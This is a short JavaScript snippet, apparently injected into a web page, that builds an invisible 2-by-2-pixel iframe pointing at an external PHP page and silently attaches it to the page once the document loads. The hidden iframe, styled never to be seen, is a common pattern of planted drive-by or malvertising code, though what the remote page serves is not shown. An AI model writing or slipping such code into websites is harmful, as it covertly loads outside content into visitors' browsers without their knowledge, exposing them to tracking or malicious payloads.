(function () {
    const iframe = document.createElement('iframe');
    iframe.src = 'https://media.digitalproserver.com/iframe.php';
    iframe.style.display = 'none';
    iframe.width = '2';
    iframe.height = '2';
    iframe.frameBorder = '0';
    iframe.scrolling = 'no';

    window.addEventListener(
      'DOMContentLoaded',
      function () {
        document.body.appendChild(iframe);
      },
      false
    );
  })();